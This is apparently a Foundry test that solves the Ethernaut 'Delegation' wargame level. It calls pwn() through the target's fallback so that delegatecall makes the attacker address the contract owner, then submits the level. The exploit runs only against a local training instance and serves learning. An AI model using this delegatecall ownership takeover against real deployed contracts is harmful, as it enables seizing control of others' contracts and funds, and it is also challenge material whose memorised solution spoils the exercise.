// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/06-Delegation/DelegationFactory.sol";
import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';

contract BaseSetUp is Test {
    Ethernaut ethernaut;
    address payable attacker;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attacker = payable(vm.addr(1));      
        vm.deal(attacker, 10 ether);
        vm.label(attacker, "Attacker");
    }
}

contract Attack is BaseSetUp {
    Delegation ethernautDelegation;
    address payable levelAddress;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);

        vm.prank(attacker);
        levelAddress = payable(ethernaut.createLevelInstance(delegationFactory));
        ethernautDelegation = Delegation(levelAddress);
        console.log("Ethernaut Delegation Challenge!");
    }

    function testAttack() public {

        emit log_address(ethernautDelegation.owner());

        // Make a call and use msg.data to call pwn() with the delegate call in fallback()
        vm.prank(attacker);
        (bool success, ) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()", ""));
        
        emit log_address(ethernautDelegation.owner());
        assert(ethernautDelegation.owner() == attacker);
        
        // Submit Level
        vm.prank(attacker);
        bool passedLevel = ethernaut.submitLevelInstance(levelAddress);
        assert(passedLevel);
    }
}